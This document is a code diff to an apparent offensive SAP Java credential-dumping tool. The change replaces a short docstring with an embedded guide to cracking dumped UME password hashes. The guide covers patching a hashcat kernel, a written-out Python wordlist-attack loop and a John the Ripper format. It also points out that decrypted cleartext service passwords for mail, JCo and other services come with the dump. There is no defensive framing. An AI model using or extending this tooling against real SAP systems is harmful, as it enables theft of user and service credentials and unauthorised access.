@@ -299,20 +299,57 @@ def parse_password_hashes(query_result: dict) -> list:
 def hashes_to_text(hashes: list, configentry_secrets: list = None) -> str:
     """Render hash records + cleartext config-entry secrets as one text file.
 
-    UME hashes go under a header that documents the iteration algorithm so a
-    cracker (or human) knows what they're looking at.  J2EE_CONFIGENTRY
-    secrets — already decrypted to cleartext by SecStoreFS — are listed
-    underneath in `cid::name:value` form for easy review.
+    Includes a self-contained cracking guide as a header comment block, since
+    SAP UME's iteration recipe (SHA-N(pwd + prev_digest)) doesn't match any
+    standard hashcat or JtR mode.
     """
     lines = [
         "# SAP Java password material",
+        "# =================================================================",
         "#",
-        "# Section 1: UME user hashes (UME_STRINGS j_user/j_password pairs)",
+        "# Section 1: UME user hashes (UME_STRINGS j_password rows)",
         "# Format: username:{ALGORITHM, ITERATIONS, SALT_LEN}base64(hash || salt)",
-        "# Algorithm: digest = SHA-N(password + salt); for i in range(iterations - 1):",
-        "#                       digest = SHA-N(password + digest)",
-        "# Use sap_java_secstore.ume_password_check(stored_hash, candidate) for cracking,",
-        "# or rebuild via sap_java_secstore.ume_password_hash(candidate, salt=...).",
+        "# Algorithm:",
+        "#   digest = SHA-N(password + salt)",
+        "#   for i in range(iterations - 1):",
+        "#       digest = SHA-N(password + digest)",
+        "#   stored = base64(digest || salt)",
+        "#",
+        "# >>> Cracking with hashcat <<<",
+        "#",
+        "# SAP UME's iteration is SHA-N(password + prev_digest), NOT the",
+        "# common SHA(salt + prev_digest) PBE variant — so no built-in",
+        "# hashcat mode (-m) matches.  You have two options:",
+        "#",
+        "#   Option A — hashcat with a generic-hash custom kernel.",
+        "#     Use the OpenCL `--brain` + custom `--hash-type 99999` kernel,",
+        "#     OR use hashcat's built-in `-m 1430` (sha256(pass)) as a",
+        "#     starting template and patch the iteration loop to append",
+        "#     password+digest each round.  Reference algorithm in",
+        "#     sap_java_secstore.py::ume_password_hash().",
+        "#",
+        "#   Option B (recommended) — wordlist attack with the bundled Python helper:",
+        "#     # crack_java_hashes.py  (small wrapper around sap_java_secstore)",
+        "#     from sap_java_secstore import ume_password_check",
+        "#     hashes = [(user, hash) for line in open('hashes_java_<SID>_<ts>.txt')",
+        "#               for (user, hash) in [line.split(':', 1)]",
+        "#               if not line.startswith('#')]",
+        "#     for word in open('wordlist.txt'):",
+        "#         w = word.strip()",
+        "#         for u, h in hashes:",
+        "#             if ume_password_check(h, w):",
+        "#                 print(f'CRACKED {u}:{w}')",
+        "#",
+        "#   Option C — John the Ripper (saph-sha256 dynamic format).",
+        "#     JtR ships a saph-sha256 plugin but it implements the salt",
+        "#     iteration variant, not SAP UME's pwd iteration variant.  You",
+        "#     would need to add a small dynamic format expression that",
+        "#     matches the algorithm above.  See JtR's `dynamic_compiler.c`",
+        "#     and the SAP_H plug-in for reference.",
+        "#",
+        "# >>> Tip: Section 2 below already gives you cleartext passwords for <<<",
+        "# >>> mail / JCo / SDIC / ws.* services without any cracking needed. <<<",
+        "#",
         "",
     ]
     if hashes:
